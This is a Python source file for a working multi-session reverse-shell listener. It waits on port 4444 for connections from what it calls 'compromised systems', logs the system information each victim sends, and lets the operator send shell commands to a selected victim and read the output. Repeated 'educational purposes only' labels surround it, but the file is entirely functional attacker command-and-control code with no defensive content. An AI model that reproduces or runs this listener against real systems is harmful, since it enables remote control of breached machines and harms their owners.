# listener.py
# IMPORTANT: This is for EDUCATIONAL PURPOSES ONLY
# This demonstrates security concepts in a controlled environment

import socket
import threading
import sys
import argparse
import time
import os

class EducationalListener:
    """
    Educational listener for demonstrating security concepts.
    
    THIS IS FOR EDUCATIONAL PURPOSES ONLY in a controlled environment.
    This demonstrates how an attacker might receive connections from
    compromised systems.
    """
    
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.server_socket = None
        self.connections = []
        self.running = False
        self.current_connection = None
        self.current_connection_index = -1
    
    def start_server(self):
        """Start the educational listener server."""
        try:
            # Create the socket
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Bind to the address and port
            self.server_socket.bind((self.host, self.port))
            
            # Listen for connections
            self.server_socket.listen(5)
            
            self.running = True
            print(f"[*] Educational listener started on {self.host}:{self.port}")
            
            # Start accepting connections in a separate thread
            threading.Thread(target=self.accept_connections, daemon=True).start()
            
            # Start the command loop
            self.command_loop()
            
        except Exception as e:
            print(f"[!] Error starting server: {e}")
            self.cleanup()
    
    def accept_connections(self):
        """Accept incoming connections."""
        while self.running:
            try:
                # Accept a connection
                client_socket, address = self.server_socket.accept()
                
                # Store the connection
                connection_info = {
                    'socket': client_socket,
                    'address': address,
                    'info': client_socket.recv(1024).decode()
                }
                
                self.connections.append(connection_info)
                
                # Print connection information
                print(f"\n[+] Connection received from {address[0]}:{address[1]}")
                print(f"[+] System information:\n{connection_info['info']}")
                
                # Update the command prompt
                self.update_prompt()
                
            except KeyboardInterrupt:
                print("\n[*] Keyboard interrupt received, shutting down...")
                self.running = False
                break
            except Exception as e:
                if self.running:
                    print(f"[!] Error accepting connection: {e}")
                    
    def list_connections(self):
        """List all active connections."""
        if not self.connections:
            print("[!] No active connections")
            return
        
        print("\nActive Connections:")
        print("==================")
        for i, conn in enumerate(self.connections):
            print(f"[{i}] {conn['address'][0]}:{conn['address'][1]}")
    
    def select_connection(self, index):
        """Select a connection to interact with."""
        try:
            index = int(index)
            if 0 <= index < len(self.connections):
                self.current_connection = self.connections[index]
                self.current_connection_index = index
                print(f"[*] Now interacting with {self.current_connection['address'][0]}:{self.current_connection['address'][1]}")
                return True
            else:
                print("[!] Invalid connection index")
                return False
        except ValueError:
            print("[!] Invalid input. Please enter a number.")
            return False
    
    def send_command(self, command):
        """Send a command to the selected connection."""
        if not self.current_connection:
            print("[!] No connection selected. Use 'list' to see available connections and 'select <id>' to choose one.")
            return
        
        try:
            # Send the command
            self.current_connection['socket'].send(command.encode())
            
            # Get the response
            response = self.current_connection['socket'].recv(4096).decode()
            
            # Print the response
            print(response)
            
        except Exception as e:
            print(f"[!] Error sending command: {e}")
            print("[!] Connection may have been lost")
            
            # Remove the connection
            if self.current_connection in self.connections:
                self.connections.remove(self.current_connection)
            
            self.current_connection = None
            self.current_connection_index = -1
    
    def update_prompt(self):
        """Update the command prompt."""
        sys.stdout.write("\n> ")
        sys.stdout.flush()
    
    def command_loop(self):
        """Main command loop for the educational listener."""
        help_text = """
Available Commands:
==================
help              - Show this help message
list              - List all active connections
select <id>       - Select a connection to interact with
exit              - Exit the listener
quit              - Exit the listener

When a connection is selected:
<command>         - Send the command to the selected connection
back              - Go back to the main menu
"""
        
        print("[*] Type 'help' to see available commands")
        
        while self.running:
            try:
                # Get the command
                if self.current_connection:
                    prompt = f"[{self.current_connection_index}]> "
                else:
                    prompt = "> "
                
                sys.stdout.write(prompt)
                sys.stdout.flush()
                
                command = input().strip()
                
                # Process the command
                if command.lower() == "help":
                    print(help_text)
                
                elif command.lower() == "list":
                    self.list_connections()
                
                elif command.lower().startswith("select "):
                    index = command.split(" ")[1]
                    self.select_connection(index)
                
                elif command.lower() in ["exit", "quit"]:
                    print("[*] Exiting...")
                    self.running = False
                    break
                
                elif self.current_connection and command.lower() == "back":
                    self.current_connection = None
                    self.current_connection_index = -1
                    print("[*] Returned to main menu")
                
                elif self.current_connection:
                    self.send_command(command)
                
                else:
                    print("[!] Unknown command. Type 'help' to see available commands.")
                
            except KeyboardInterrupt:
                print("\n[*] Keyboard interrupt received, shutting down...")
                self.running = False
                break
            except Exception as e:
                print(f"[!] Error in command loop: {e}")
    
    def cleanup(self):
        """Clean up resources before exiting."""
        # Close all connections
        for conn in self.connections:
            try:
                conn['socket'].close()
            except:
                pass
        
        # Close the server socket
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        
        print("[*] All connections closed")

def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description="Educational listener for cybersecurity demonstrations"
    )
    
    parser.add_argument(
        "--host", 
        default="0.0.0.0", 
        help="Host to listen on (default: 0.0.0.0)"
    )
    
    parser.add_argument(
        "--port", 
        type=int, 
        default=4444, 
        help="Port to listen on (default: 4444)"
    )
    
    return parser.parse_args()

def main():
    """Main function."""
    # Parse arguments
    args = parse_arguments()
    
    # Print banner
    print("""
  _____    _              _         _      _     _                       
 |_   _|__| |_ _ __(_)___  | |    (_)___| |__ ___ _ __   ___ _ __ 
   | |/ _ \ __| '__| / __| | |    | / __| '_ \ / _ \ '_ \ / _ \ '__|
   | |  __/ |_| |  | \__ \ | |___ | \__ \ | | |  __/ | | |  __/ |   
   |_|\___|\__|_|  |_|___/ |_____| |_|___/_| |_|\___|_| |_|\___|_|   
                          |_______|                                  

  Educational Security Demonstration - For controlled environments only
    """)
    
    # Create and start the listener
    listener = EducationalListener(args.host, args.port)
    
    try:
        listener.start_server()
    except KeyboardInterrupt:
        print("\n[*] Keyboard interrupt received, shutting down...")
    finally:
        listener.cleanup()

if __name__ == "__main__":
    main()